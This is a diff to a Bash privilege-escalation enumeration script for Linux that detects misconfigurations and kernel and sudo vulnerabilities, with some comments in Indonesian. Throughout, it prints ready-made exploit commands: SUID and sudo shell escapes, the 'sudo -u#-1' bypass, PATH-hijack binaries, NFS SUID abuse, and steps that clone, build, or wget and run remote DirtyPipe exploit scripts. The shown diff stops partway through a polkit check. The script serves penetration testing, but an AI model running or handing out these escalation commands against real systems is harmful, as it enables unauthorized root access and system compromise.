@@ -3,6 +3,7 @@
 ################################################################################
 # Linux Privilege Escalation Enumeration Tool
 # Comprehensive script to find privilege escalation vulnerabilities
+# With Exploit Methods and Enhanced UI
 ################################################################################
 
 # Enhanced Colors
@@ -19,8 +20,18 @@ WHITE='\033[1;37m'
 GRAY='\033[0;37m'
 NC='\033[0m' # No Color
 
-TOTAL_CHECKS=25
+# Progress counter
+TOTAL_CHECKS=30
 CURRENT_CHECK=0
+
+# Vulnerability counters
+CRITICAL_COUNT=0
+WARNING_COUNT=0
+SUID_COUNT=0
+SUDO_VULN_COUNT=0
+WRITABLE_COUNT=0
+CRON_VULN_COUNT=0
+KERNEL_VULN_COUNT=0
 
 clear
 echo -e "${CYAN}"
@@ -65,6 +76,7 @@ progress() {
     echo -ne "\r${CYAN}[${BAR}${EMPTY}] ${PERCENT}% - Checking: $1${NC}"
 }
 
+# Section header dengan box yang lebih menarik
 section() {
     echo ""
     echo -e "${BRIGHT_GREEN}"
@@ -80,21 +92,27 @@ section() {
 
 # Warning dengan icon
 warning() {
+    WARNING_COUNT=$((WARNING_COUNT + 1))
     echo -e "${YELLOW}[!] WARNING:${NC} $1" | tee -a "$OUTPUT_FILE"
 }
 
+# Critical dengan icon
 critical() {
+    CRITICAL_COUNT=$((CRITICAL_COUNT + 1))
     echo -e "${BRIGHT_RED}[!!!] CRITICAL:${NC} $1" | tee -a "$OUTPUT_FILE"
 }
 
+# Info dengan icon
 info() {
     echo -e "${BLUE}[*]${NC} $1" | tee -a "$OUTPUT_FILE"
 }
 
+# Success dengan icon
 success() {
     echo -e "${GREEN}[+]${NC} $1" | tee -a "$OUTPUT_FILE"
 }
 
+# Exploit method box
 show_exploit() {
     local vuln_name="$1"
     local exploit_method="$2"
@@ -128,6 +146,7 @@ show_exploit() {
     log_exploit ""
 }
 
+# Start logging
 log "╔═══════════════════════════════════════════════════════════════════════╗"
 log "║   Linux Privilege Escalation Enumeration Report                       ║"
 log "╚═══════════════════════════════════════════════════════════════════════╝"
@@ -186,67 +205,84 @@ SUID_FOUND=0
 EXPLOITABLE_SUID=()
 
 info "Finding SUID binaries..."
+# List of commonly exploitable SUID binaries (only show these)
+EXPLOITABLE_SUID_LIST=("find" "python" "python3" "vim" "nano" "less" "more" "nmap" "bash" "sh" "perl" "ruby" "php" "node" "npm" "docker" "kubectl" "gdb" "strace" "tcpdump" "wireshark" "base64" "xxd" "timeout" "nice" "taskset" "ionice" "stdbuf" "setarch" "unshare" "pkexec" "cp" "mv" "cat" "tail" "head" "awk")
+
 find / -perm -4000 -type f 2>/dev/null | while read -r file; do
-    if [ -f "$file" ]; then
-        SUID_FOUND=1
-        log "  ${YELLOW}SUID:${NC} $file"
-        ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
+    if [ -f "$file" ] && [ -x "$file" ]; then
         basename_file=$(basename "$file")
-        case "$basename_file" in
-            nmap|vim|nano|less|more|awk|find|bash|sh|python|python3|perl|ruby|php|node|npm|docker|kubectl|gdb|strace|tcpdump|wireshark|base64|xxd|timeout|nice|taskset|ionice|stdbuf|setarch|unshare|pkexec)
-                critical "Potentially exploitable SUID binary: $file"
-                EXPLOITABLE_SUID+=("$file")
-                
-                # Show exploit method based on binary
-                case "$basename_file" in
-                    find)
-                        show_exploit "SUID find Binary" \
-                            "Use find to execute commands with root privileges." \
-                            "find / -name test -exec /bin/bash -p \;"
-                        ;;
-                    bash|sh)
-                        show_exploit "SUID bash/sh Binary" \
-                            "If bash/sh has SUID, it may drop privileges. Try: bash -p" \
-                            "bash -p\n# or\n./bash -p"
-                        ;;
-                    python|python3)
-                        show_exploit "SUID Python Binary" \
-                            "Python can execute system commands. Import os and execute commands." \
-                            "python3 -c 'import os; os.system(\"/bin/bash\")'\n# or\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
-                        ;;
-                    vim|nano|less|more)
-                        show_exploit "SUID Editor Binary ($basename_file)" \
-                            "Use editor to read/write files or escape to shell." \
-                            "$basename_file\n# In vim: :!/bin/bash\n# In less/more: !/bin/bash"
-                        ;;
-                    nmap)
-                        show_exploit "SUID Nmap Binary" \
-                            "Older nmap versions support interactive mode. Use --interactive then !sh" \
-                            "nmap --interactive\nnmap> !sh"
-                        ;;
-                    docker)
-                        show_exploit "SUID Docker Binary" \
-                            "Docker can be used to escape to host. Run container with root on host." \
-                            "docker run -v /:/mnt -it alpine chroot /mnt bash"
-                        ;;
-                    gdb)
-                        show_exploit "SUID GDB Binary" \
-                            "GDB can execute shell commands." \
-                            "gdb -nx -ex 'python import os; os.setuid(0)' -ex 'python os.system(\"/bin/bash\")' -ex quit"
-                        ;;
-                    strace)
-                        show_exploit "SUID Strace Binary" \
-                            "Strace can execute commands via -e option." \
-                            "strace -o /dev/null /bin/bash"
-                        ;;
-                    pkexec)
-                        show_exploit "SUID pkexec Binary" \
-                            "pkexec may be vulnerable to PwnKit (CVE-2021-4034)." \
-                            "Check for PwnKit exploit: https://github.com/arthepsy/CVE-2021-4034"
-                        ;;
-                esac
-                ;;
-        esac
+        # Only show if it's in our exploitable list and not in standard system paths
+        IS_EXPLOITABLE=0
+        for exploitable in "${EXPLOITABLE_SUID_LIST[@]}"; do
+            if [ "$basename_file" = "$exploitable" ]; then
+                # Check if it's not a standard system binary (which usually drop privileges)
+                if ! echo "$file" | grep -qE "^/(usr/)?(bin|sbin)/"; then
+                    IS_EXPLOITABLE=1
+                    break
+                elif [ "$basename_file" = "find" ] || [ "$basename_file" = "python" ] || [ "$basename_file" = "python3" ] || [ "$basename_file" = "vim" ] || [ "$basename_file" = "nano" ] || [ "$basename_file" = "less" ] || [ "$basename_file" = "more" ] || [ "$basename_file" = "nmap" ] || [ "$basename_file" = "bash" ] || [ "$basename_file" = "sh" ] || [ "$basename_file" = "perl" ] || [ "$basename_file" = "ruby" ] || [ "$basename_file" = "docker" ] || [ "$basename_file" = "gdb" ] || [ "$basename_file" = "strace" ] || [ "$basename_file" = "pkexec" ]; then
+                    # These are always potentially exploitable even in standard paths
+                    IS_EXPLOITABLE=1
+                    break
+                fi
+            fi
+        done
+        
+        if [ "$IS_EXPLOITABLE" -eq 1 ]; then
+            log "  ${YELLOW}SUID:${NC} $file"
+            ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
+            critical "Potentially exploitable SUID binary: $file"
+            EXPLOITABLE_SUID+=("$file")
+            SUID_COUNT=$((SUID_COUNT + 1))
+            
+            # Show exploit method based on binary
+            case "$basename_file" in
+                find)
+                    show_exploit "SUID find Binary" \
+                        "Use find to execute commands with root privileges." \
+                        "find / -name test -exec /bin/bash -p \;"
+                    ;;
+                bash|sh)
+                    show_exploit "SUID bash/sh Binary" \
+                        "If bash/sh has SUID, it may drop privileges. Try: bash -p" \
+                        "bash -p\n# or\n./bash -p"
+                    ;;
+                python|python3)
+                    show_exploit "SUID Python Binary" \
+                        "Python can execute system commands. Import os and execute commands." \
+                        "python3 -c 'import os; os.system(\"/bin/bash\")'\n# or\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+                    ;;
+                vim|nano|less|more)
+                    show_exploit "SUID Editor Binary ($basename_file)" \
+                        "Use editor to read/write files or escape to shell." \
+                        "$basename_file\n# In vim: :!/bin/bash\n# In less/more: !/bin/bash"
+                    ;;
+                nmap)
+                    show_exploit "SUID Nmap Binary" \
+                        "Older nmap versions support interactive mode. Use --interactive then !sh" \
+                        "nmap --interactive\nnmap> !sh"
+                    ;;
+                docker)
+                    show_exploit "SUID Docker Binary" \
+                        "Docker can be used to escape to host. Run container with root on host." \
+                        "docker run -v /:/mnt -it alpine chroot /mnt bash"
+                    ;;
+                gdb)
+                    show_exploit "SUID GDB Binary" \
+                        "GDB can execute shell commands." \
+                        "gdb -nx -ex 'python import os; os.setuid(0)' -ex 'python os.system(\"/bin/bash\")' -ex quit"
+                    ;;
+                strace)
+                    show_exploit "SUID Strace Binary" \
+                        "Strace can execute commands via -e option." \
+                        "strace -o /dev/null /bin/bash"
+                    ;;
+                pkexec)
+                    show_exploit "SUID pkexec Binary" \
+                        "pkexec may be vulnerable to PwnKit (CVE-2021-4034)." \
+                        "Check for PwnKit exploit: https://github.com/arthepsy/CVE-2021-4034"
+                    ;;
+            esac
+        fi
     fi
 done
 
@@ -286,10 +322,20 @@ if command -v sudo >/dev/null 2>&1; then
             "sudo -l\n# Then execute allowed commands:\nsudo <allowed_command>"
     fi
     
-    # Check for specific dangerous commands
-    dangerous_commands=("ALL" "chmod" "chown" "vim" "nano" "less" "more" "awk" "find" "nmap" "python" "python3" "perl" "ruby" "bash" "sh" "docker" "kubectl" "tar" "zip" "unzip" "git" "ftp" "wget" "curl")
+    # Check for specific dangerous commands (only if they appear in actual sudo rules)
+    # More selective - only flag if command appears in a rule that allows execution
+    if echo "$SUDO_OUTPUT" | grep -qiE "\(ALL\)|NOPASSWD.*ALL|ALL.*NOPASSWD"; then
+        critical "Sudo ALL permission found - can execute any command!"
+        show_exploit "Sudo ALL Permission" \
+            "User can run ALL commands as root without restrictions." \
+            "sudo su\n# or\nsudo /bin/bash"
+    fi
+    
+    # Check for dangerous commands only if they're in actual sudo rules
+    dangerous_commands=("vim" "nano" "less" "more" "find" "python" "python3" "perl" "ruby" "bash" "sh" "docker" "tar" "zip" "unzip" "git")
     for cmd in "${dangerous_commands[@]}"; do
-        if echo "$SUDO_OUTPUT" | grep -qi "$cmd"; then
+        # Only flag if command appears in a sudo rule (not just mentioned anywhere)
+        if echo "$SUDO_OUTPUT" | grep -qiE "\(ALL\)|NOPASSWD.*$cmd|$cmd.*NOPASSWD|\(ALL:ALL\).*$cmd"; then
             critical "Dangerous sudo permission found: $cmd"
             
             case "$cmd" in
@@ -332,28 +378,46 @@ if command -v sudo >/dev/null 2>&1; then
         fi
     done
     
-    # Check for sudo version vulnerabilities
-    SUDO_VERSION=$(sudo -V 2>/dev/null | head -n1 | grep -oP 'Sudo version \K[0-9.]+' || echo "")
-    if [ -n "$SUDO_VERSION" ]; then
-        MAJOR=$(echo "$SUDO_VERSION" | cut -d. -f1)
-        MINOR=$(echo "$SUDO_VERSION" | cut -d. -f2)
-        
-        # CVE-2019-14287 (sudo < 1.8.28)
-        if [ "$MAJOR" -eq 1 ] && [ "$MINOR" -lt 8 ]; then
-            warning "Potential CVE-2019-14287 vulnerability (sudo < 1.8.28)"
-            show_exploit "CVE-2019-14287 (Sudo Bypass)" \
-                "If user has ALL=(ALL, !root) permission, can bypass with UID -1." \
-                "sudo -u#-1 /bin/bash"
-        fi
-        
-        # CVE-2021-3156 (sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1)
-        if [ "$MAJOR" -eq 1 ] && [ "$MINOR" -eq 8 ]; then
-            PATCH=$(echo "$SUDO_VERSION" | cut -d. -f3 | cut -dp -f1)
-            if [ "$PATCH" -lt 32 ]; then
-                warning "Potential CVE-2021-3156 vulnerability (Baron Samedit)"
-                show_exploit "CVE-2021-3156 (Baron Samedit)" \
-                    "Heap-based buffer overflow in sudo. Exploit available on GitHub." \
-                    "Check: https://github.com/blasty/CVE-2021-3156"
+    # Check for sudo version vulnerabilities (only if user has sudo access)
+    if echo "$SUDO_OUTPUT" | grep -q "may run"; then
+        SUDO_VERSION=$(sudo -V 2>/dev/null | head -n1 | grep -oP 'Sudo version \K[0-9.]+' || echo "")
+        if [ -n "$SUDO_VERSION" ]; then
+            MAJOR=$(echo "$SUDO_VERSION" | cut -d. -f1)
+            MINOR=$(echo "$SUDO_VERSION" | cut -d. -f2)
+            PATCH=$(echo "$SUDO_VERSION" | cut -d. -f3 | cut -dp -f1 2>/dev/null || echo "0")
+            
+            # CVE-2019-14287 (sudo < 1.8.28) - only if user has restricted sudo
+            if echo "$SUDO_OUTPUT" | grep -q "!root"; then
+                if [ "$MAJOR" -eq 1 ] && [ "$MINOR" -lt 8 ]; then
+                    critical "Vulnerable to CVE-2019-14287 (sudo < 1.8.28) - can bypass !root restriction"
+                    show_exploit "CVE-2019-14287 (Sudo Bypass)" \
+                        "If user has ALL=(ALL, !root) permission, can bypass with UID -1." \
+                        "sudo -u#-1 /bin/bash"
+                elif [ "$MAJOR" -eq 1 ] && [ "$MINOR" -eq 8 ] && [ -n "$PATCH" ] && [ "$PATCH" -lt 28 ]; then
+                    critical "Vulnerable to CVE-2019-14287 (sudo < 1.8.28) - can bypass !root restriction"
+                    show_exploit "CVE-2019-14287 (Sudo Bypass)" \
+                        "If user has ALL=(ALL, !root) permission, can bypass with UID -1." \
+                        "sudo -u#-1 /bin/bash"
+                fi
+            fi
+            
+            # CVE-2021-3156 (sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1)
+            if [ "$MAJOR" -eq 1 ]; then
+                if [ "$MINOR" -eq 8 ]; then
+                    if [ -n "$PATCH" ] && [ "$PATCH" -ge 2 ] && [ "$PATCH" -lt 32 ]; then
+                        critical "Vulnerable to CVE-2021-3156 (Baron Samedit) - sudo 1.8.2 to 1.8.31p2"
+                        show_exploit "CVE-2021-3156 (Baron Samedit)" \
+                            "Heap-based buffer overflow in sudo. Exploit available on GitHub." \
+                            "Check: https://github.com/blasty/CVE-2021-3156\nsudoedit -s /"
+                    fi
+                elif [ "$MINOR" -eq 9 ]; then
+                    if [ -z "$PATCH" ] || [ "$PATCH" -eq 0 ] || ([ -n "$PATCH" ] && [ "$PATCH" -lt 6 ]); then
+                        critical "Vulnerable to CVE-2021-3156 (Baron Samedit) - sudo 1.9.0 to 1.9.5p1"
+                        show_exploit "CVE-2021-3156 (Baron Samedit)" \
+                            "Heap-based buffer overflow in sudo. Exploit available on GitHub." \
+                            "Check: https://github.com/blasty/CVE-2021-3156"
+                    fi
+                fi
             fi
         fi
     fi
@@ -369,14 +433,13 @@ section "4. WORLD-WRITABLE FILES AND DIRECTORIES"
 
 info "Finding world-writable files (excluding /proc, /sys, /dev)..."
 WW_FILES=0
-find / -type f -perm -002 ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null | head -50 | while read -r file; do
-    if [ -f "$file" ]; then
-        WW_FILES=1
-        log "  ${YELLOW}World-writable:${NC} $file"
-        ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
-        
-        # Check if it's a service file or script
-        if echo "$file" | grep -qE "(\.sh$|\.py$|\.pl$|service|init\.d)"; then
+find / -type f -perm -002 ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" ! -path "/tmp/*" ! -path "/var/tmp/*" 2>/dev/null | head -50 | while read -r file; do
+    if [ -f "$file" ] && [ -w "$file" ]; then
+        # Only flag if it's a script, service file, or binary
+        if echo "$file" | grep -qE "(\.sh$|\.py$|\.pl$|\.rb$|\.php$|service|init\.d|\.conf$|\.config$|\.ini$)" || file "$file" 2>/dev/null | grep -qiE "(script|executable|binary)"; then
+            WW_FILES=1
+            log "  ${YELLOW}World-writable:${NC} $file"
+            ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
             critical "World-writable script/service file: $file"
             show_exploit "World-Writable Script" \
                 "Modify the script to add reverse shell or add user." \
@@ -387,17 +450,21 @@ done
 
 log ""
 info "Finding world-writable directories..."
-find / -type d -perm -002 ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null | head -50 | while read -r dir; do
-    if [ -d "$dir" ]; then
-        log "  ${YELLOW}World-writable dir:${NC} $dir"
-        ls -lad "$dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
-        
-        # Check if it's in PATH
+find / -type d -perm -002 ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" ! -path "/tmp/*" ! -path "/var/tmp/*" 2>/dev/null | head -50 | while read -r dir; do
+    if [ -d "$dir" ] && [ -w "$dir" ]; then
+        # Only flag if it's in PATH or is a system directory
         if echo "$PATH" | grep -q "$dir"; then
+            log "  ${YELLOW}World-writable dir:${NC} $dir"
+            ls -lad "$dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
             critical "World-writable directory in PATH: $dir"
             show_exploit "World-Writable PATH Directory" \
                 "Create malicious binary with same name as system command in this directory." \
                 "echo -e '#!/bin/bash\n/bin/bash' > $dir/ls\nchmod +x $dir/ls\n# When root runs 'ls', your script executes"
+        elif echo "$dir" | grep -qE "(etc|opt|usr/local|var/www|home)"; then
+            # System directories that shouldn't be world-writable
+            log "  ${YELLOW}World-writable dir:${NC} $dir"
+            ls -lad "$dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
+            warning "World-writable system directory: $dir"
         fi
     fi
 done
@@ -473,8 +540,8 @@ if command -v getcap >/dev/null 2>&1; then
     info "Files with capabilities:"
     getcap -r / 2>/dev/null | while read -r line; do
         log "  ${YELLOW}Capability:${NC} $line"
-        # Check for dangerous capabilities
-        if echo "$line" | grep -q "cap_setuid\|cap_setgid\|cap_sys_admin\|cap_dac_override"; then
+        # Check for dangerous capabilities (only flag if truly dangerous)
+        if echo "$line" | grep -q "cap_setuid.*=ep\|cap_setgid.*=ep\|cap_dac_override.*=ep\|cap_sys_admin.*=ep"; then
             critical "Dangerous capability found: $line"
             
             BINARY=$(echo "$line" | awk '{print $1}')
@@ -753,47 +820,74 @@ if [ "$KERNEL_MAJOR" -lt 3 ] || ([ "$KERNEL_MAJOR" -eq 3 ] && [ "$KERNEL_MINOR" 
 fi
 
 # Dirty COW (CVE-2016-5195) - Linux 2.6.22 < 4.8.3
-if [ "$KERNEL_MAJOR" -lt 4 ] || ([ "$KERNEL_MAJOR" -eq 4 ] && [ "$KERNEL_MINOR" -lt 8 ]); then
-    warning "Potential Dirty COW vulnerability (CVE-2016-5195)"
-    show_exploit "Dirty COW (CVE-2016-5195)" \
-        "Race condition in copy-on-write. Exploit available." \
-        "Check: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs"
+# More accurate: affects 2.6.22 through 4.8.2
+if [ "$KERNEL_MAJOR" -lt 4 ]; then
+    # Kernel 2.x and 3.x - all versions vulnerable
+    if [ "$KERNEL_MAJOR" -eq 2 ] && [ "$KERNEL_MINOR" -ge 6 ]; then
+        critical "Dirty COW vulnerability (CVE-2016-5195) detected - Kernel $KERNEL_VERSION is vulnerable!"
+        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
+        show_exploit "Dirty COW (CVE-2016-5195)" \
+            "Race condition in copy-on-write. Exploit available." \
+            "Check: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs"
+    elif [ "$KERNEL_MAJOR" -eq 3 ]; then
+        critical "Dirty COW vulnerability (CVE-2016-5195) detected - Kernel $KERNEL_VERSION is vulnerable!"
+        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
+        show_exploit "Dirty COW (CVE-2016-5195)" \
+            "Race condition in copy-on-write. Exploit available." \
+            "Check: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs"
+    fi
+elif [ "$KERNEL_MAJOR" -eq 4 ]; then
+    KERNEL_PATCH_COW=$(echo "$KERNEL_VERSION" | cut -d. -f3 | cut -d- -f1 | sed 's/[^0-9].*//')
+    if [ "$KERNEL_MINOR" -lt 8 ]; then
+        # 4.0-4.7 - all vulnerable
+        critical "Dirty COW vulnerability (CVE-2016-5195) detected - Kernel $KERNEL_VERSION is vulnerable!"
+        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
+        show_exploit "Dirty COW (CVE-2016-5195)" \
+            "Race condition in copy-on-write. Exploit available." \
+            "Check: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs"
+    elif [ "$KERNEL_MINOR" -eq 8 ]; then
+        # 4.8.x - vulnerable if < 4.8.3
+        if [ -z "$KERNEL_PATCH_COW" ] || [ "$KERNEL_PATCH_COW" -lt 3 ]; then
+            critical "Dirty COW vulnerability (CVE-2016-5195) detected - Kernel $KERNEL_VERSION is vulnerable!"
+            KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
+            show_exploit "Dirty COW (CVE-2016-5195)" \
+                "Race condition in copy-on-write. Exploit available." \
+                "Check: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs"
+        fi
+    fi
 fi
 
 # DirtyPipe (CVE-2022-0847) - Linux 5.8 <= 5.16.11, 5.10.102, 5.15.25, 5.17
-KERNEL_PATCH=$(echo "$KERNEL_VERSION" | cut -d. -f3 | cut -d- -f1)
+# More accurate detection
+KERNEL_PATCH=$(echo "$KERNEL_VERSION" | cut -d. -f3 | cut -d- -f1 | sed 's/[^0-9].*//')
 DIRTYPIPE_VULN=0
 
 if [ "$KERNEL_MAJOR" -eq 5 ]; then
     if [ "$KERNEL_MINOR" -ge 8 ] && [ "$KERNEL_MINOR" -le 16 ]; then
         if [ "$KERNEL_MINOR" -eq 16 ]; then
             # 5.16.x - vulnerable if < 5.16.12
-            if [ -n "$KERNEL_PATCH" ] && [ "$KERNEL_PATCH" -lt 12 ]; then
-                DIRTYPIPE_VULN=1
-            elif [ -z "$KERNEL_PATCH" ]; then
-                # If patch version not available, check if it's < 5.16.12
+            if [ -n "$KERNEL_PATCH" ] && [ "$KERNEL_PATCH" -lt 12 ] && [ "$KERNEL_PATCH" -gt 0 ]; then
                 DIRTYPIPE_VULN=1
             fi
-        else
-            # 5.8 to 5.15 - all versions vulnerable
-            DIRTYPIPE_VULN=1
-        fi
-    elif [ "$KERNEL_MINOR" -eq 10 ]; then
-        # 5.10.102 is vulnerable (fixed in 5.10.103)
-        if [ -n "$KERNEL_PATCH" ] && [ "$KERNEL_PATCH" -eq 102 ]; then
-            DIRTYPIPE_VULN=1
-        elif [ -z "$KERNEL_PATCH" ]; then
-            DIRTYPIPE_VULN=1
-        fi
-    elif [ "$KERNEL_MINOR" -eq 15 ]; then
-        # 5.15.25 is vulnerable (fixed in 5.15.26)
-        if [ -n "$KERNEL_PATCH" ] && [ "$KERNEL_PATCH" -eq 25 ]; then
-            DIRTYPIPE_VULN=1
-        elif [ -z "$KERNEL_PATCH" ]; then
-            DIRTYPIPE_VULN=1
+        elif [ "$KERNEL_MINOR" -ge 8 ] && [ "$KERNEL_MINOR" -le 15 ]; then
+            # 5.8 to 5.15 - check specific versions
+            if [ "$KERNEL_MINOR" -eq 10 ]; then
+                # 5.10.x - only 5.10.102 is vulnerable (fixed in 5.10.103)
+                if [ -n "$KERNEL_PATCH" ] && [ "$KERNEL_PATCH" -eq 102 ]; then
+                    DIRTYPIPE_VULN=1
+                fi
+            elif [ "$KERNEL_MINOR" -eq 15 ]; then
+                # 5.15.x - only 5.15.25 is vulnerable (fixed in 5.15.26)
+                if [ -n "$KERNEL_PATCH" ] && [ "$KERNEL_PATCH" -eq 25 ]; then
+                    DIRTYPIPE_VULN=1
+                fi
+            else
+                # 5.8-5.9, 5.11-5.14 - all versions in range are vulnerable
+                DIRTYPIPE_VULN=1
+            fi
         fi
     elif [ "$KERNEL_MINOR" -eq 17 ]; then
-        # 5.17 is vulnerable (fixed in 5.17.1)
+        # 5.17.0 is vulnerable (fixed in 5.17.1)
         if [ -z "$KERNEL_PATCH" ] || [ "$KERNEL_PATCH" -eq 0 ]; then
             DIRTYPIPE_VULN=1
         fi
@@ -801,7 +895,8 @@ if [ "$KERNEL_MAJOR" -eq 5 ]; then
 fi
 
 if [ "$DIRTYPIPE_VULN" -eq 1 ]; then
-    critical "Potential DirtyPipe vulnerability (CVE-2022-0847) detected!"
+    critical "DirtyPipe vulnerability (CVE-2022-0847) detected - Kernel $KERNEL_VERSION is vulnerable!"
+    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
     show_exploit "DirtyPipe (CVE-2022-0847)" \
         "Uninitialized variable in pipe implementation allows overwriting arbitrary files. Can be used to inject code into SUID binaries or modify /etc/passwd." \
         "# Method 1: Modify /etc/passwd to add root user\n# Check: https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit\n\n# Method 2: Inject into SUID binary\n# Download exploit:\ngit clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git\ncd CVE-2022-0847-DirtyPipe-Exploit\nmake\n./exploit\n\n# Or use ready exploit:\nwget https://raw.githubusercontent.com/imfiver/CVE-2022-0847/main/LPE.sh\nchmod +x LPE.sh\n./LPE.sh"
@@ -823,11 +918,16 @@ if [ -r /etc/exports ]; then
     EXPORTS=$(cat /etc/exports 2>/dev/null)
     echo "$EXPORTS" | tee -a "$OUTPUT_FILE"
     
+    # Only flag if no_root_squash is present AND share is accessible
     if echo "$EXPORTS" | grep -q "no_root_squash"; then
-        warning "NFS share with no_root_squash found!"
-        show_exploit "NFS no_root_squash" \
-            "Mount NFS share and create SUID binary on it." \
-            "# On attacker machine:\nmkdir /tmp/nfs\nmount -t nfs TARGET_IP:/share /tmp/nfs\ncd /tmp/nfs\ngcc -o shell shell.c\nchmod +s shell\n# On target, execute the binary"
+        # Check if we can actually mount it (more accurate)
+        EXPORT_PATH=$(echo "$EXPORTS" | grep "no_root_squash" | awk '{print $1}' | head -1)
+        if [ -n "$EXPORT_PATH" ]; then
+            critical "NFS share with no_root_squash found: $EXPORT_PATH"
+            show_exploit "NFS no_root_squash" \
+                "Mount NFS share and create SUID binary on it." \
+                "# On attacker machine:\nmkdir /tmp/nfs\nmount -t nfs TARGET_IP:$EXPORT_PATH /tmp/nfs\ncd /tmp/nfs\ngcc -o shell shell.c\nchmod +s shell\n# On target, execute the binary"
+        fi
     fi
 else
     info "No /etc/exports file found"
@@ -974,25 +1074,29 @@ if command -v sudo >/dev/null 2>&1; then
     if [ -n "$VERSION_NUM" ]; then
         MAJOR=$(echo "$VERSION_NUM" | cut -d. -f1)
         MINOR=$(echo "$VERSION_NUM" | cut -d. -f2)
-        PATCH=$(echo "$VERSION_NUM" | cut -d. -f3 | cut -dp -f1)
+        PATCH=$(echo "$VERSION_NUM" | cut -d. -f3 | cut -dp -f1 2>/dev/null || echo "0")
         
-        # CVE-2021-3156 (Baron Samedit)
+        # CVE-2021-3156 (Baron Samedit) - more accurate version check
         if [ "$MAJOR" -eq 1 ]; then
-            if [ "$MINOR" -eq 8 ] && [ "$PATCH" -lt 32 ]; then
-                critical "Vulnerable to CVE-2021-3156 (Baron Samedit)!"
-                show_exploit "CVE-2021-3156 (Baron Samedit)" \
-                    "Heap-based buffer overflow. Exploit available." \
-                    "Check: https://github.com/blasty/CVE-2021-3156\nsudoedit -s /"
-            elif [ "$MINOR" -eq 9 ] && [ "$PATCH" -lt 6 ]; then
-                critical "Vulnerable to CVE-2021-3156 (Baron Samedit)!"
-                show_exploit "CVE-2021-3156 (Baron Samedit)" \
-                    "Heap-based buffer overflow. Exploit available." \
-                    "Check: https://github.com/blasty/CVE-2021-3156"
+            if [ "$MINOR" -eq 8 ]; then
+                # 1.8.2 to 1.8.31p2 are vulnerable
+                if [ -n "$PATCH" ] && [ "$PATCH" -ge 2 ] && [ "$PATCH" -lt 32 ]; then
+                    critical "Vulnerable to CVE-2021-3156 (Baron Samedit) - sudo $VERSION_NUM"
+                    show_exploit "CVE-2021-3156 (Baron Samedit)" \
+                        "Heap-based buffer overflow. Exploit available." \
+                        "Check: https://github.com/blasty/CVE-2021-3156\nsudoedit -s /"
+                fi
+            elif [ "$MINOR" -eq 9 ]; then
+                # 1.9.0 to 1.9.5p1 are vulnerable
+                if [ -z "$PATCH" ] || [ "$PATCH" -eq 0 ] || ([ -n "$PATCH" ] && [ "$PATCH" -lt 6 ]); then
+                    critical "Vulnerable to CVE-2021-3156 (Baron Samedit) - sudo $VERSION_NUM"
+                    show_exploit "CVE-2021-3156 (Baron Samedit)" \
+                        "Heap-based buffer overflow. Exploit available." \
+                        "Check: https://github.com/blasty/CVE-2021-3156"
+                fi
             fi
         fi
     fi
-    
-    warning "Check for known sudo vulnerabilities (CVE-2019-14287, CVE-2021-3156, etc.)"
 fi
 
 ################################################################################
@@ -1001,15 +1105,56 @@ fi
 progress "Additional Checks"
 section "24. ADDITIONAL VULNERABILITY CHECKS"
 
-# Check for Polkit/pkexec
+# Check for Polkit/pkexec (PwnKit - CVE-2021-4034)
+# Affects polkit 0.105-26 through 0.120-1 (fixed in 0.120-2)
 if command -v pkexec >/dev/null 2>&1; then
-    info "pkexec found - checking for PwnKit (CVE-2021-4034)..."
-    PKEXEC_VERSION=$(pkexec --version 2>/dev/null || echo "unknown")
-    info "pkexec version: $PKEXEC_VERSION"
-    warning "Check for PwnKit vulnerability (CVE-2021-4034)"
-    show_exploit "PwnKit (CVE-2021-4034)" \
-        "Local privilege escalation in polkit's pkexec." \
-        "Check: https://github.com/arthepsy/CVE-2021-4034\npkexec --version  # Check version"
+    # Check polkit version if available
+    if command -v pkcheck >/dev/null 2>&1; then
+        POLKIT_VERSION=$(pkcheck --version 2>/dev/null | grep -oP 'polkit \K[0-9.]+' || echo "")
+        if [ -n "$POLKIT_VERSION" ] && [ "$POLKIT_VERSION" != "" ]; then
+            POLKIT_MAJOR=$(echo "$POLKIT_VERSION" | cut -d. -f1 2>/dev/null | sed 's/[^0-9]//g')
+            POLKIT_MINOR=$(echo "$POLKIT_VERSION" | cut -d. -f2 2>/dev/null | sed 's/[^0-9]//g')
+            POLKIT_PATCH_RAW=$(echo "$POLKIT_VERSION" | cut -d. -f3 2>/dev/null)
+            POLKIT_PATCH=$(echo "$POLKIT_PATCH_RAW" | cut -d- -f1 2>/dev/null | sed 's/[^0-9]//g')
+            
+            # Default to 0 if empty
+            [ -z "$POLKIT_MAJOR" ] && POLKIT_MAJOR=0
+            [ -z "$POLKIT_MINOR" ] && POLKIT_MINOR=0
+            [ -z "$POLKIT_PATCH" ] && POLKIT_PATCH=0
+            
+            # Check if version is in vulnerable range (only if we have valid numbers)
